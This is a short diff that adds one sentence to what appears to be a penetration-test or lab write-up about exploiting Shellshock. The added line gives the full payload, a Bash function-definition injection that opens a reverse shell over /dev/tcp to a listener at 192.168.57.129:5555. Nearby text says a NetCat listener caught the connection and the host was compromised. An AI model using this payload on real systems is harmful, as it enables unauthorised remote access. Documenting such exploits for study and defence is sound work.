@@ -143,6 +143,8 @@ Connection: close
 Upgrade-Insecure-Requests: 1
 ```
 
+The full payload used here was ```() { :;}; /bin/bash -c 'bash -i >& /dev/tcp/192.168.57.129/5555 0>&1'```, where any Bash command after the first semicolon (in this case, a simple TCP connect) could be executed.
+
 I also ran a NetCat listener to capture the connection request and was inevitably able to break into the host.
 
 ```
